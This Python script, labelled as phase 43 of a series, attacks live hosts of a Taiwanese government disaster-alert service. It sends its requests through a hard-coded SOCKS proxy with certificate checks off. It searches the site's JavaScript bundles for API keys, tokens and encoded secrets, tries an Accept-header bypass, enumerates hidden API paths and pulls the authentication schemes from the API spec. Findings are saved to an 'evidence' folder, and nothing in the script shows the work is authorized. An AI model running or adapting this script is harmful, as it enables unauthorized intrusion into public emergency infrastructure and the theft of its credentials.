#!/usr/bin/env python3
"""Phase 43: Extract API key from Vue.js SPA + capvalue with Accept headers."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
HEADERS = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}

# 1. Get the Vue.js SPA JS files from alertsmodule
print("=== alertsmodule.ncdr.nat.gov.tw - Vue SPA JS ===")
# Get the main HTML to find all asset URLs
r = requests.get('https://alertsmodule.ncdr.nat.gov.tw/', proxies=PROXY, verify=False, timeout=15,
                headers={'User-Agent': 'Mozilla/5.0'})
html = r.text

# Find all JS files
js_files = re.findall(r'src=["\'](/web/static/js/[^"\']+)["\']', html)
print(f"  JS files: {js_files}")

# Also find chunk CSS
css_files = re.findall(r'href=["\'](/web/static/css/[^"\']+)["\']', html)
print(f"  CSS files: {css_files}")

# Download and search each JS file for API key references
for js in js_files:
    js_url = f'https://alertsmodule.ncdr.nat.gov.tw{js}'
    r = requests.get(js_url, proxies=PROXY, verify=False, timeout=15, headers={'User-Agent': 'Mozilla/5.0'})
    print(f"\n  GET {js} -> {r.status_code}, len={len(r.text)}")
    if r.status_code == 200 and len(r.text) > 1:
        # Search for API key patterns
        content = r.text
        # Look for Capapikey usage
        capapikey_uses = re.findall(r'Capapikey\s*:?\s*["\']?([A-Za-z0-9_\-]+)', content, re.I)
        api_key_uses = re.findall(r'api[_-]?key\s*:?\s*["\']?([A-Za-z0-9_\-]{8,})', content, re.I)
        header_uses = re.findall(r'headers\s*:', content)
        token_uses = re.findall(r'token\s*:?\s*["\']([A-Za-z0-9_\-]{8,})', content, re.I)
        
        if capapikey_uses:
            print(f"    Capapikey values: {capapikey_uses}")
        if api_key_uses:
            print(f"    API key values: {api_key_uses}")
        if token_uses:
            print(f"    Token values: {token_uses}")
        
        # Look for AddValueApi endpoint references
        api_refs = re.findall(r'AddValueApi|v1/swagger|alerts\.ncdr', content)
        if api_refs:
            print(f"    API refs: {api_refs[:10]}")
        
        # Look for any base64 encoded values that might be the key
        b64_uses = re.findall(r'["\']([A-Za-z0-9+/]{12,}={0,2})["\']', content)
        if b64_uses:
            for b in b64_uses[:5]:
                try:
                    decoded = base64.b64decode(b).decode('utf-8', errors='ignore')
                    if any(kw in decoded.lower() for kw in ['capapikey', 'apikey', 'ncdr', 'alert', 'key']):
                        print(f"    Base64 decoded: {b} -> {decoded[:100]}")
                except:
                    pass
        
        # Look for environment config or window object assignments
        env_refs = re.findall(r'(?:window|app|vm)\.([A-Za-z]+)\s*=\s*["\']([A-Za-z0-9_\-]{8,})["\']', content)
        if env_refs:
            print(f"    Env configs: {env_refs[:10]}")
        
        # Save JS for further analysis
        with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_alertsmodule_{js.split("/")[-1]}', 'w') as f:
            f.write(content[:10000])

# 2. Try capvalue.ncdr.nat.gov.tw with different Accept headers
print("\n=== capvalue.ncdr.nat.gov.tw - Accept header bypass ===")
accept_headers = [
    ('application/json', 'json'),
    ('text/html', 'html'),
    ('application/xml', 'xml'),
    ('*/*', 'wildcard'),
    ('text/plain', 'text'),
]
for accept, name in accept_headers:
    try:
        r = requests.get('https://capvalue.ncdr.nat.gov.tw/', proxies=PROXY, verify=False, timeout=15,
                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': accept})
        print(f"  Accept={accept}: {r.status_code}, len={len(r.text)}, ct={r.headers.get('Content-Type','')[:50]}")
        if r.status_code == 200 and len(r.text) > 72:
            print(f"    Body: {r.text[:500]}")
            # Save
            with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_capvalue_{name}.html', 'w') as f:
                f.write(r.text[:5000])
    except Exception as e:
        print(f"  Accept={accept}: ERR {str(e)[:60]}")

# 3. Also try capvalue with common API paths and json accept
print("\n=== capvalue.ncdr.nat.gov.tw - paths with Accept: application/json ===")
for path in ['/', '/api', '/api/values', '/api/key', '/swagger', '/health', '/status', '/config', '/key']:
    r = requests.get(f'https://capvalue.ncdr.nat.gov.tw{path}', proxies=PROXY, verify=False, timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
    ct = r.headers.get('Content-Type', '')
    print(f"  GET {path} -> {r.status_code}, len={len(r.text)}, ct={ct[:50]}")
    if r.status_code != 406 and len(r.text) > 1:
        print(f"    Body: {r.text[:300]}")
        with open(f'/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/ncdr_capvalue_{path.replace("/","_").strip("_") or "root"}.json', 'w') as f:
            f.write(r.text[:3000])

# 4. Extract full swagger spec for endpoints
print("\n=== Full Swagger Endpoint Analysis ===")
r = requests.get('https://alerts.ncdr.nat.gov.tw/AddValueApi/swagger/v1/swagger.json', proxies=PROXY, verify=False, timeout=15)
spec = r.json()
print("Security schemes:", json.dumps(spec.get('components', {}).get('securitySchemes', {}), ensure_ascii=False, indent=2))
print(f"\nTotal endpoints: {sum(len(methods) for methods in spec.get('paths', {}).values())}")
print(f"Total paths: {len(spec.get('paths', {}))}")
for path in sorted(spec.get('paths', {}).keys()):
    methods = list(spec['paths'][path].keys())
    print(f"  {path} [{', '.join(methods)}]")

print("\nDone.")
